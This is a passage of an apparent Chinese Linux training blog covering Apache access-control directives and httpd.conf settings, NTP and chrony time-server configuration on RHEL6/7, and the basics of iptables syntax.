<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rhel6	rhel7</span><br><span class="line">2.2	2.4</span><br><span class="line">order	require</span><br><span class="line"></span><br><span class="line">》eg1:所有请求都被拒绝</span><br><span class="line">order deny,allow //先拒绝，后允许</span><br><span class="line">deny from all	//拒绝所有</span><br><span class="line">------------------------------</span><br><span class="line">require all denied //拒绝所有</span><br><span class="line"></span><br><span class="line">》eg2：所有请求都允许</span><br><span class="line">order allow，deny //先允许，后拒绝</span><br><span class="line">allow from all</span><br><span class="line">------------------------------------</span><br><span class="line">require all granted</span><br><span class="line"></span><br><span class="line">》拒绝172.25.0.10/test.uplooking.com 的请求</span><br><span class="line">order allow，deny //先允许，后拒绝</span><br><span class="line">allow from all</span><br><span class="line">deny from 172.25.0.10</span><br><span class="line">-------------------------------------</span><br><span class="line">require  all granted</span><br><span class="line">require no ip 172.25.0.10</span><br><span class="line">require no host test.uplooking.com</span><br><span class="line"></span><br><span class="line">》只允许172.25.3.10和172.25.0.0/24 uplooking.com 的请求</span><br><span class="line">order deny，allow //先决绝，后允许</span><br><span class="line">deny from all</span><br><span class="line">allow from 172.25.3.10</span><br><span class="line">allow from 172.25.0.0/24</span><br><span class="line">-------------------------------------</span><br><span class="line">require all denied</span><br><span class="line">require ip 172.25.3.10 172.25.0</span><br><span class="line">require host  uplooking.com</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Apache配置文件-etc-httpd-conf-httpd-conf"><a href="#Apache配置文件-etc-httpd-conf-httpd-conf" class="headerlink" title="Apache配置文件/etc/httpd/conf/httpd.conf"></a>Apache配置文件/etc/httpd/conf/httpd.conf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1）</span><br><span class="line"><span class="meta">#</span><span class="bash"> ServerRoot “/etc/httpd“</span></span><br><span class="line">	ServerRoot用于指定守护进程httpd的运行目录，httpd在启动之后将自动将进程的当前目录改变为这个目录，因此如果设置文件中指定的文件或目录是相对路径，那么真实路径就位于这个ServerR oot定义的路径之下。</span><br><span class="line"></span><br><span class="line">2）</span><br><span class="line">hhhidFile /var/run/httpd.pid</span><br><span class="line">	PidFile指定的文件将记录httpd守护进程的进程号，由于httpd能自动复制其自身，因此系统中有多个httpd进程，但只有一个进程为最初启动的进程，它为其他进程的父进程，对这个进程发送信号将影响所有的httpd进程。PidFILE定义的文件中就记录httpd父进程的进程号。</span><br><span class="line">　　</span><br><span class="line"><span class="meta">#</span><span class="bash"> Timeout 300</span></span><br><span class="line">	Timeout定义客户程序和服务器连接的超时间隔，超过这个时间间隔（秒）后服务器将断开与客户机的连接。</span><br><span class="line"><span class="meta">#</span><span class="bash"> KeepAlive On</span></span><br><span class="line">	在HTTP 1.0中，一次连接只能作传输一次HTTP请求，而KeepAlive参数用于支持HTTP 1.1版本的一次连接、多次传输功能，这样就可以在一次连接中传递多个HTTP请求。不过只有较新的浏览器才支持这个功能</span><br><span class="line"><span class="meta">#</span><span class="bash"> MaxKeepAliveRequests 100</span></span><br><span class="line">	MaxKeepAliveRequests为一次连接可以进行的HTTP请求的最大请求次数。将其值设为0将支持在一次连接内进行无限次的传输请求。事实上没有客户程序在一次连接中请求太多的页面，通常达不到这个上限就完成连接了。</span><br><span class="line"><span class="meta">#</span><span class="bash"> KeepAliveTimeout 15</span></span><br><span class="line">	KeepAliveTimeout测试一次连接中的多次请求传输之间的时间，如果服务器已经完成了一次请求，但一直没有接收到客户程序的下一次请求，在间隔超过了这个参数设置的值之后，服务器就断开连接。</span><br><span class="line"><span class="meta">#</span><span class="bash"> ThreadsPerChild 50</span></span><br><span class="line">	设置服务器使用进程的数目。这是以服务器的响应速度为准的, 数目太大则会变慢</span><br><span class="line"><span class="meta">#</span><span class="bash"> MaxRequestsPerChild 30</span></span><br><span class="line">	使用子进程的方式提供服务的Web服务，常用的方式是一个子进程为一次连接服务，这样造成的问题就是每次连接都需要生成、退出子进程的系统操作，使得这些额外的处理过程占据了计算机的大量处理能力。因此最好的方式是一个子进程可以为多次连接请求服务，这样就不需要这些生成、退出进程的系统消耗，Apache就采用了这样的方式，一次连接结束后，子进程并不退出，而是停留在系统中等待下一次服务请求，这样就极大的提高了性能。但由于在处理过程中子进程要不断的申请和释放内存，次数多了就会造成一些内存垃圾，就会影响系统的稳定性，并且影响系统资源的有效利用。因此在一个副本处理过一定次数的请求之后，就可以让这个子进程副本退出，再从原始的htt pd进程中重新复制一个干净的副本，这样就能提高系统的稳定性。这样，每个子进程处理服务请求次数由MaxRe questPerChild定义。 缺省的设置值为30，这个值对于具备高稳定性特点的FreeBSD系统来讲是过于保守的设置，可以设置为1000甚至更高，设置为0支持每个副本进行无限次的服务处理。　　　　</span><br><span class="line"><span class="meta">#</span><span class="bash"> ServerAdmin root@localhost</span></span><br><span class="line">	配置文件中应该改变的也许只有ServerAdmin， 这一项用于配置WWW服务器的管理员的email地址，这将在HTTP服务出现错误的条件下返回给浏览器，以便让Web使用者和管理员联系，报告错误。习惯上使用服务器上的webmaster作为WWW服务器的管理员，通过邮件服务器的别名机制，将发送到webmaster 的电子邮件发送给真正的Web管理员。</span><br><span class="line"><span class="meta">#</span><span class="bash"> ServerName localhost</span></span><br><span class="line">	缺省情况下，并不需要指定这个ServerName参数，服务器将自动通过名字解析过程来获得自己的名字，但如果服务器的名字解析有问题（通常为反向解析不正确），或者没有正式的DNS名字，也可以在这里指定I P地址。当ServerName设置不正确的时候，服务器不能正常启动。</span><br><span class="line">通常一个Web服务器可以具有多个名字，客户浏览器可以使用所有这些名字或IP地址来访问这台服务器，但在没有定义虚拟主机的情况下，服务器总是以自己的正式名字回应浏览器。ServerName就定义了Web服务器自己承认的正式名字，例如一台服务器名字（在DNS中定义了A类型）为freebsd.exmaple.org.cn，同时为了方便记忆还定义了一个别名（CNAME记录）为www.exmaple.org.cn，那么Apache自动解析得到的名字就为freebsd.example.org.cn，这样不管客户浏览器使用哪个名字发送请求，服务器总是告诉客户程序自己为freebsd.example.org.cn。虽然这一般并不会造成什么问题，但是考虑到某一天服务器可能迁移到其他计算机上，而只想通过更改DNS中的www别名配置就完成迁移任务，所以不想让客户在其书签中使用 freebsd记录下这个服务器的地址，就必须使用ServerName来重新指定服务器的正式名字。</span><br><span class="line">　　</span><br><span class="line">3）</span><br><span class="line"><span class="meta">#</span><span class="bash"> DocumentRoot “/var/www/html“</span></span><br><span class="line">	DocumentRoot定义这个服务器对外发布的超文本文档存放的路径，客户程序请求的UR L就被映射为这个目录下的网页文件。这个目录下的子目录，以及使用符号连接指出的文件和目录都能被浏览器访问，只是要在URL上使用同样的相对目录名。注意，符号连接虽然逻辑上位于根文档目录之下，但实际上可以位于计算机上的任意目录中，因此可以使客户程序能访问那些根文档目录之外的目录，这在增加了灵活性的同时但减少了安全性。Apache在目录的访问控制中提供了FollowSymLinks选项来打开或关闭支持符号连接的特性。</span><br><span class="line">4）</span><br><span class="line"><span class="meta">#</span><span class="bash"> &lt;Directory /&gt;</span></span><br><span class="line">　　 Options FollowSymLinks</span><br><span class="line">　　 AllowOverride None</span><br><span class="line">　　&lt;/Directory&gt;</span><br><span class="line">	Apache服务器可以针对目录进行文档的访问控制，然而访问控制可以通过两种方式来实现，一个是在设置文件 httpd.conf（或access.conf）中针对每个目录进行设置，另一个方法是在每个目录下设置访问控制文件，通常访问控制文件名字为.htaccess。虽然使用这两个方式都能用于控制浏览器的访问，然而使用配置文件的方法要求每次改动后重新启动httpd守护进程，比较不灵活，因此主要用于配置服务器系统的整体安全控制策略，而使用每个目录下的.htaccess文件设置具体目录的访问控制更为灵活方便.</span><br><span class="line">　	由于Apache对一个目录的访问控制设置是能够被下一级目录继承的，因此对根目录的设置将影响到它的下级目录。注意由于AllowOverride None的设置，使得Apache服务器不需要查看根目录下的访问控制文件，也不需要查看以下各级目录下的访问控制文件，直至httpd.conf（或access.conf ）中为某个目录指定了允许Alloworride，即允许查看访问控制文件。由于Apache对目录访问控制是采用的继承方式，如果从根目录就允许查看访问控制文件，那么Apache就必须一级一级的查看访问控制文件，对系统性能会造成影响。而缺省关闭了根目录的这个特性，就使得Apache从httpd.conf中具体指定的目录向下搜寻，减少了搜寻的级数，增加了系统性能。因此对于系统根目录设置AllowOverride None不但对于系统安全有帮助，也有益于系统性能。</span><br><span class="line">　　&lt;Directory /&gt;</span><br><span class="line">   Options Indexes FollowSymLinks</span><br><span class="line">　　 AllowOverride None</span><br><span class="line">　　 Order allow,deny</span><br><span class="line">　　 Allow from all</span><br><span class="line">　　&lt;/Directory&gt;</span><br><span class="line">	这里定义的是系统对外发布文档的目录的访问设置，设置不同的AllowOverride选项，以定义配置文件中的目录设置和用户目录下的安全控制文件的关系，而Options选项用于定义该目录的特性。</span><br><span class="line"><span class="meta">#</span><span class="bash">  ErrorLog /var/<span class="built_in">log</span>/httpd-error.log</span></span><br><span class="line">　　LogLevel warn</span><br><span class="line">　　LogFormat “%h %l %u %t \“%r\“ %&gt;s %b \“%&#123;Referer&#125;i\“ \“%&#123;User-Agent&#125;i\““ combined</span><br><span class="line">　　LogFormat “%h %l %u %t \“%r\“ %&gt;s %b“ common</span><br><span class="line">　　LogFormat “%&#123;Referer&#125;i -&gt; %U“ referer</span><br><span class="line">　　LogFormat “%&#123;User-agent&#125;i“ agent</span><br><span class="line"><span class="meta">　　#</span><span class="bash">CustomLog /var/<span class="built_in">log</span>/httpd-access.log common</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash">CustomLog /var/<span class="built_in">log</span>/httpd-referer.log referer</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash">CustomLog /var/<span class="built_in">log</span>/httpd-agent.log agent</span></span><br><span class="line">　　CustomLog /var/log/httpd-access.log combined</span><br><span class="line">	这里定义了系统日志的形式，对于服务器错误记录，由ErrorLog、LogLevel 来定义不同的错误日志文件及其记录内容。 这是通过在 CustomLog中指定不同的记录类型来完成的。common表示普通的对单页面请求访问记录，referer表示每个页面的引用记录，可以看出一个页面中包含的请求数，agent表示对客户机的类型记录，显然可以将现有的combined 定义的设置行注释掉，并使用common、referer和agent作为CustomLog的参数，来为不同种类的日志分别指定日志记录文件。显然，LogFormat是用于定义不同类型的日志进行记录时使用的格式， 这里使用了以%开头的宏定义，以记录不同的内容。</span><br><span class="line">如果这些参数指定的文件使用的是相对路径，那么就是相对于ServerRoot的路径。</span><br><span class="line"><span class="meta">#</span><span class="bash"> Alias /icons/ “/usr/<span class="built_in">local</span>/www/icons/“</span></span><br><span class="line">　　 Options Indexes MultiViews</span><br><span class="line">　　 AllowOverride None</span><br><span class="line">　　 Order allow,deny</span><br><span class="line">　　 Allow from all</span><br><span class="line">	Alias参数用于将URL与服务器文件系统中的真实位置进行直接映射，一般的文档将在DocumentRoot 中进行查询，然而使用Alias定义的路径将直接映射到相应目录下，而不再到DocumentRoot 下面进行查询。因此Alias可以用来映射一些公用文件的路径，例如保存了各种常用图标的icons路径。这样使得除了使用符号连接之外，文档根目录（DocumentRoot）外的目录也可以通过使用了Alias映射，提供给浏览器访问。</span><br><span class="line">定义好映射的路径之后，应该需要使用Directory语句设置访问限制。</span><br><span class="line"><span class="meta">　　#</span><span class="bash">NameVirtualHost 12.34.56.78:80</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash">NameVirtualHost 12.34.56.78</span></span><br><span class="line"><span class="meta">　　#</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash"> ServerAdmin webmaster@host.some_domain.com</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash"> DocumentRoot /www/docs/host.some_domain.com</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash"> ServerName host.some_domain.com</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash"> ErrorLog logs/host.some_domain.com-error_log</span></span><br><span class="line"><span class="meta">　　#</span><span class="bash"> CustomLog logs/host.some_domain.com-access_log common</span></span><br><span class="line"><span class="meta">　　#</span></span><br><span class="line">	这个字段是虚拟主机的相关内容，虚拟主机是在一台Web服务器上，可以为多个单独域名提供Web服务，并且每个域名都完全独立，包括具有完全独立的文档目录结构及设置，这样域名之间完全独立，不但使用每个域名访问到的内容完全独立，并且使用另一个域名无法访问其他域名提供的网页内容。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>时间同步服务NTP和Chony</title>
    <url>/2016/12/23/booboo_easy_service/06_ntp_chrony/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="left">服务</th>
<th align="left">域名解析服务</th>
<th align="left">文件共享服务</th>
<th align="left"></th>
<th align="left"></th>
<th align="left">web服务</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">DNS</td>
<td align="left">FTP</td>
<td align="left">NFS</td>
<td align="left">SAMBA</td>
<td align="left">APACHE</td>
</tr>
<tr>
<td align="left">软件</td>
<td align="left">bind    bind-chroot</td>
<td align="left">vsftpd</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">samba    samba-common</td>
<td align="left">httpd</td>
</tr>
<tr>
<td align="left">服务</td>
<td align="left">named</td>
<td align="left">vsftpd</td>
<td align="left">rpcbind nfs</td>
<td align="left">smb nmb</td>
<td align="left">httpd</td>
</tr>
<tr>
<td align="left">daemon</td>
<td align="left">named</td>
<td align="left">vsftpd</td>
<td align="left">rpcbind nfs</td>
<td align="left">smbd nmbd</td>
<td align="left">httpd</td>
</tr>
<tr>
<td align="left">端口号</td>
<td align="left">53</td>
<td align="left">21</td>
<td align="left">111 2049</td>
<td align="left">137 138 139 445</td>
<td align="left">80 8080</td>
</tr>
<tr>
<td align="left">配置文件</td>
<td align="left">/etc/named.conf /etc/named.rfc1912.zones</td>
<td align="left">/etc/vsftpd/vsftpd.conf</td>
<td align="left">/etc/exports</td>
<td align="left">/etc/samba/smb.conf</td>
<td align="left">/etc/httpd/conf/httpd.conf</td>
</tr>
<tr>
<td align="left">数据文件</td>
<td align="left">/var/named/</td>
<td align="left">/var/ftp/</td>
<td align="left"></td>
<td align="left">/var/lib/samba</td>
<td align="left">/var/www</td>
</tr>
<tr>
<td align="left">客户端</td>
<td align="left"></td>
<td align="left">lftp</td>
<td align="left">rpcbind</td>
<td align="left">samba-client</td>
<td align="left">elinks</td>
</tr>
<tr>
<td align="left">命令</td>
<td align="left">nslookup</td>
<td align="left">lftp</td>
<td align="left">nfs-utils mount</td>
<td align="left">smbclient</td>
<td align="left">links</td>
</tr>
</tbody></table>
<h3 id="Ntp服务的作用"><a href="#Ntp服务的作用" class="headerlink" title="Ntp服务的作用"></a>Ntp服务的作用</h3><p>大家设想一下，如果我们的主机时间不准，可以怎么做？有将硬件时间和软件时间同步的办法，也可以使用<code>date -s</code>去设置一个时间，但是你怎么知道你设置的时间就一定准了，或者说你能确定硬件时间一定准么？不能保证吧？那这时候我们就可以找天文台或者一些网络上的时间服务器去做同步，那这时候怎么去做呢？</p>
<p>这里就用到一种服务了，这种服务叫做ntp服务，它是一种针对时间同步的服务。</p>
<h3 id="Ntp服务的原理"><a href="#Ntp服务的原理" class="headerlink" title="Ntp服务的原理"></a>Ntp服务的原理</h3><p>其实更细化来说，NTP服务器（Network Time Protocol）是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源（如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正（LAN上与标准间差小于1毫秒，WAN上几十毫秒），且可介由加密确认的方式来防止恶毒的协议攻击。时间按NTP服务器的等级传播。按照离外部UTC源的远近把所有服务器归入不同的Stratum（层）中。</p>
<p>Stratum层也是一个分层式的结构，下一层找上一层做同步，上一层还有上一层。以此类推。</p>
<h3 id="时间同步服务配置"><a href="#时间同步服务配置" class="headerlink" title="时间同步服务配置"></a>时间同步服务配置</h3><p>服务端</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">rhel6</th>
<th align="left">rhel7</th>
</tr>
</thead>
<tbody><tr>
<td align="left">软件</td>
<td align="left">ntp</td>
<td align="left">chrony</td>
</tr>
<tr>
<td align="left">service</td>
<td align="left">ntpd</td>
<td align="left">chronyd</td>
</tr>
<tr>
<td align="left">daemon</td>
<td align="left">ntpd</td>
<td align="left">chronyd</td>
</tr>
<tr>
<td align="left">配置文件</td>
<td align="left">/etc/ntp.conf</td>
<td align="left">/etc/chrony.conf</td>
</tr>
<tr>
<td align="left">数据文件</td>
<td align="left">/var/lib/ntp</td>
<td align="left">/var/lib/chrony</td>
</tr>
<tr>
<td align="left">日志文件</td>
<td align="left">/var/log/ntpstats</td>
<td align="left">/var/log/chrony</td>
</tr>
</tbody></table>
<p>客户端</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">ntpdate</th>
<th align="left">timedatectl</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">ntpdate 172.25.0.11</td>
<td align="left">timedatectl set-ntp 1</td>
</tr>
</tbody></table>
<h3 id="项目实践1：配置ntp时间同步服务器"><a href="#项目实践1：配置ntp时间同步服务器" class="headerlink" title="项目实践1：配置ntp时间同步服务器"></a>项目实践1：配置ntp时间同步服务器</h3><p>rhel6 软件</p>
<p>ntp-4.2.6p5-1.el6.x86_64</p>
<h4 id="配置详解"><a href="#配置详解" class="headerlink" title="配置详解"></a>配置详解</h4><p>NTP安全设置(restrict)</p>
<p>运行一个NTP Server不需要占用很多的系统资源,所以也不用专门配置独立的服务器,就可以给许多client提供时间同步服务, 但是一些基本的安全设置还是很有必要的那么这里一个很简单的思路就是第一我们只允许局域网内一部分的用户连接到我们的服务器. 第二个就是这些client不能修改我们服务器上的时间</p>
<p>driftfile /var/lib/ntp/drift  #侦测BIOS时钟与Linux系统时间的差异写入次文件。</p>
<p>利用restrict 来管理权限控制</p>
<p>Restrict [IP]  mask [netmask_IP] [parameter]</p>
<p>Parameter 的参数主要如下：</p>
<ul>
<li>ignore :拒绝所有类型的NTP联机。</li>
<li>nomodify: 客户端不能使用ntpc 与ntpq 这两个程序来修改服务器的时间参数，但客户端可透过这部主机来进行网络校时；</li>
<li>noquery:客户端不能够使用ntpc 与ntpq 等指令来查询时间服务器，不提供NTP的网络校时。</li>
<li>notrap:不提供trap 这个运程事件登入的功能。</li>
<li>notrust:拒绝没有认证的客户端。</li>
<li>Kod:kod技术可以阻止“Kiss of Death “包对服务器的破坏。拒绝服务攻击</li>
<li>Nopeer:不与其他同一层的NTP服务器进行时间同步。</li>
</ul>
<p>利用server 设定上层NTP服务器，格式如下：</p>
<p>server [IP or hostname] [prefer]</p>
<ul>
<li><p>perfer:表示优先级最高</p>
</li>
<li><p>burst ：当一个运程NTP服务器可用时，向它发送一系列的并发包进行检测。</p>
</li>
<li><p>iburst ：当一个运程NTP服务器不可用时，向它发送一系列的并发包进行检测。</p>
<p>注：默认情况小15分钟后才会与上层NTP服务器进行时间校对。</p>
</li>
</ul>
<blockquote>
<p>谁能来同步我的时间？</p>
</blockquote>
<p>首先我们对于默认的client拒绝所有的操作</p>
<p>代码:<br><code>restrict default kod nomodify notrap nopeer noquery</code></p>
<p>然后允许本机地址一切的操作</p>
<p>代码:<br><code>restrict 127.0.0.1</code></p>
<p>最后我们允许局域网内所有client连接到这台服务器同步时间.但是拒绝让他们修改服务器上的时间</p>
<p>代码:<br><code>restrict 172.25.0.0 mask 255.255.255.0 nomodify</code></p>
<blockquote>
<p>我去同步谁的时间？</p>
</blockquote>
<p>server     时间同步服务器    层数比我高的，及数字比我小的</p>
<p>代码:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>

<p>####　详细步骤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务器端</span></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# yum install -y ntp</span><br><span class="line">[root@rhel6 ~]# vim /etc/ntp.conf</span><br><span class="line">[root@rhel6 ~]# grep -v "^#" /etc/ntp.conf|grep -v "^$"</span><br><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line">restrict default kod nomodify notrap nopeer noquery</span><br><span class="line">restrict -6 default kod nomodify notrap nopeer noquery</span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line">restrict 172.25.0.0 mask 255.255.255.0 nomodify</span><br><span class="line">server 172.25.0.11</span><br><span class="line">server  127.127.1.0     </span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line">keys /etc/ntp/keys</span><br><span class="line">[root@rhel6 ~]# service ntpd start</span><br><span class="line">Starting ntpd:                                             [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service iptables stop</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端</span></span><br><span class="line">[root@rhel7 ~]# which ntpdate</span><br><span class="line">/usr/sbin/ntpdate</span><br><span class="line">[root@rhel7 ~]# rpm -qf /usr/sbin/ntpdate</span><br><span class="line">ntpdate-4.2.6p5-18.el7.x86_64</span><br><span class="line">[root@rhel7 ~]# systemctl stop firewalld</span><br><span class="line">[root@rhel7 ~]# ntpdate 172.25.0.11</span><br><span class="line"> 2 Aug 06:36:51 ntpdate[8128]: step time server 172.25.0.11 offset -0.691491 sec</span><br><span class="line">[root@rhel7 ~]# date -s "2016-08-01"</span><br><span class="line">Mon Aug  1 00:00:00 EDT 2016</span><br><span class="line">[root@rhel7 ~]# date</span><br><span class="line">Mon Aug  1 00:00:01 EDT 2016</span><br><span class="line">[root@rhel7 ~]# ntpdate 172.25.0.11</span><br><span class="line"> 2 Aug 06:37:35 ntpdate[8140]: step time server 172.25.0.11 offset 110240.425235 sec</span><br><span class="line">[root@rhel7 ~]# date</span><br><span class="line">Tue Aug  2 06:37:37 EDT 2016</span><br></pre></td></tr></table></figure>

<h4 id="一些补充和拾遗（挺重要）"><a href="#一些补充和拾遗（挺重要）" class="headerlink" title="一些补充和拾遗（挺重要）"></a>一些补充和拾遗（挺重要）</h4><ol>
<li><p>配置文件中的driftfile是什么?<br>我们每一个system clock的频率都有小小的误差,这个就是为什么机器运行一段时间后会不精确.NTP会自动来监测我们时钟的误差值并予以调整.但问题是这是一个冗长的过程,所以它会把记录下来的误差先写入driftfile.这样即使你重新开机以后之前的计算结果也就不会丢失了</p>
</li>
<li><p>如何同步硬件时钟?<br>NTP一般只会同步system clock. 但是如果我们也要同步RTC(hwclock)的话那么只需要把下面的选项打开就可以了</p>
</li>
</ol>
<p>代码:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vi /etc/sysconfig/ntpd</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>让rhel6运行ntpdate更新时间时，rhel6同步失败，会提示端口被占用：如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# ntpdate 172.25.0.11</span><br><span class="line"> 2 Aug 18:39:16 ntpdate[4831]: the NTP socket is in use, exiting</span><br></pre></td></tr></table></figure></li>
<li>利用crontab让rhel7 NTP定时更新时间<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 8 * * * /usr/sbin/ntpdate 172.25.0.11</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h3 id="chrony"><a href="#chrony" class="headerlink" title="chrony"></a>chrony</h3><p>chrony-1.29.1-1.el7.x86_64</p>
<p>RHEL从7.0开始改用chrony同步时间，原ntp同步方式也可以使用，但要安装ntp服务。</p>
<p>chronyd是一个在系统后台运行的守护进程。他根据网络上其他时间服务器时间来测量本机时间的偏移量从而调整系统时钟。对于孤立系统，用户可以手动周期性的输入正确时间（通过chronyc）。在这两种情况下，chronyd决定计算机快慢的比例，并加以纠正。chronyd实现了NTP协议并且可以作为服务器或客户端。</p>
<h4 id="项目实践2：配置chrony时间同步服务器"><a href="#项目实践2：配置chrony时间同步服务器" class="headerlink" title="项目实践2：配置chrony时间同步服务器"></a>项目实践2：配置chrony时间同步服务器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# yum install -y chrony</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# vim /etc/chrony.conf</span><br><span class="line">[root@rhel7 ~]# grep -v "^#" /etc/chrony.conf |grep -v "^$"</span><br><span class="line">server 172.25.0.10</span><br><span class="line">allow 172.25.0.0/24</span><br><span class="line">stratumweight 0</span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line">rtcsync</span><br><span class="line">makestep 10 3</span><br><span class="line">bindcmdaddress 127.0.0.1</span><br><span class="line">bindcmdaddress ::1</span><br><span class="line">keyfile /etc/chrony.keys</span><br><span class="line">commandkey 1</span><br><span class="line">generatecommandkey</span><br><span class="line">noclientlog</span><br><span class="line">logchange 0.5</span><br><span class="line">logdir /var/log/chrony</span><br><span class="line">[root@rhel7 ~]# timedatectl</span><br><span class="line">      Local time: Tue 2016-08-02 07:24:15 EDT</span><br><span class="line">  Universal time: Tue 2016-08-02 11:24:15 UTC</span><br><span class="line">        RTC time: Tue 2016-08-02 11:24:15</span><br><span class="line">        Timezone: America/New_York (EDT, -0400)</span><br><span class="line">     NTP enabled: yes</span><br><span class="line">NTP synchronized: yes</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: yes</span><br><span class="line"> Last DST change: DST began at</span><br><span class="line">                  Sun 2016-03-13 01:59:59 EST</span><br><span class="line">                  Sun 2016-03-13 03:00:00 EDT</span><br><span class="line"> Next DST change: DST ends (the clock jumps one hour backwards) at</span><br><span class="line">                  Sun 2016-11-06 01:59:59 EDT</span><br><span class="line">                  Sun 2016-11-06 01:00:00 EST</span><br></pre></td></tr></table></figure>

<h3 id="项目汇总"><a href="#项目汇总" class="headerlink" title="项目汇总"></a>项目汇总</h3><p><img src="sides/ntp-lab_Page_1.jpg" alt="ntp-lab_Page_1"></p>
<p><img src="sides/ntp-lab_Page_2.jpg" alt="ntp-lab_Page_2"></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙 iptables</title>
    <url>/2016/12/23/booboo_easy_service/07_iptables_firewalld/</url>
    <content><![CDATA[<h3 id="防火墙的作用"><a href="#防火墙的作用" class="headerlink" title="防火墙的作用"></a>防火墙的作用</h3><p>防火墙是一个组件，工作在网络边缘（主机边缘），对进出网络数据包基于一定的规则检查，并在匹配某规则时由规则定义的处理进行处理的一组功能的组件。</p>
<h3 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h3><p>根据工作的层次的不同来划分，常见的防火墙工作在OSI第三层，即网络层防火墙，工作在OSI第七层的称为应用层防火墙，或者代理服务器（代理网关）。</p>
<p>网络层防火墙又称包过滤防火墙，在网络层对数据包进行选择，选择的依据是系统内设置的过滤逻辑，通过检查数据流中每个数据的源地址，目的地址，所用端口号和协议状态等因素来确定是否允许该数据包的通过，以及数据包的流向等。</p>
<p>还可以分为硬件防火墙和软件防火墙</p>
<h3 id="软件防火墙"><a href="#软件防火墙" class="headerlink" title="软件防火墙"></a>软件防火墙</h3><ul>
<li>EL6上的防火墙叫做iptables。</li>
<li>EL7上的防火墙叫做firewalld。</li>
</ul>
<h3 id="iptables语法"><a href="#iptables语法" class="headerlink" title="iptables语法"></a>iptables语法</h3><p>iptables -t table CMD chain rule-matcher -j target</p>
<pre><code>表      动作 链    规则匹配       执行操作</code></pre><h4 id="表table"><a href="#表table" class="headerlink" title="表table"></a>表table</h4><p>使用 -t 来指定表,如果省略,则代表对 filter 表进行操作</p>
<ul>
<li>filter 表:用于过滤数据包</li>
<li>nat 表:用于修改数据包的来源和目的地</li>
<li>mangle 表:用户修改数据包的生存周期等等</li>
<li>raw 表:跟踪机制</li>
</ul>
<h4 id="CMD动作"><a href="#CMD动作" class="headerlink" title="CMD动作"></a>CMD动作</h4><ul>
<li>A 追加</li>
<li>I 插入</li>
<li>D 删除</li>
<li>L 罗列</li>
<li>F 清空</li>
</ul>
<h4 id="表当中包含链chain"><a href="#表当中包含链chain" class="headerlink" title="表当中包含链chain"></a>表当中包含链chain</h4><p>链是用来区分数据包的流向状态</p>
<ul>
<li>INPUT 入站的数据包</li>
<li>OUTPUT 出站的数据包</li>
<li>PREROUTING 路由判断之前的数据包</li>
<li>POSTROUTING 路由判断之后的数据包</li>
<li>FORWARD 第一次路由判断之后,到最后一词路由判断之前</li>
</ul>
<h4 id="规则rule"><a href="#规则rule" class="headerlink" title="规则rule"></a>规则rule</h4><p>是用来判断数据包的具体情况</p>
<ul>
<li>-p 协议</li>
<li>-s 来源</li>
<li>-d 目的地</li>
<li>–sport 来源端口</li>
<li>–dport 目的端口</li>
<li>-i 入站网络接口</li>
<li>-o 出站网络接口</li>
<li>! 取反</li>
</ul>
<h4 id="执行操作target"><a href="#执行操作target" class="headerlink" title="执行操作target"></a>执行操作target</h4><ul>
<li>ACCEPT 接受</li>
<li>DROP 丢弃</li>
<li>REJECT 拒绝</li>
<li>DNAT 目标地址转换</li>
<li>SNAT 源地址转换</li>
</ul>
<h3 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h3><ol start="0">
<li>查看规则    <code>iptables -L</code></li>
<li>规则清空    <code>iptables -F</code></li>
<li>预选策略    <code>iptables -P INPUT ACCEPT</code></li>
<li>保存策略    <code>service iptables save</code> or <code>iptables-save &gt; /etc/sysconfig/iptables</code></li>
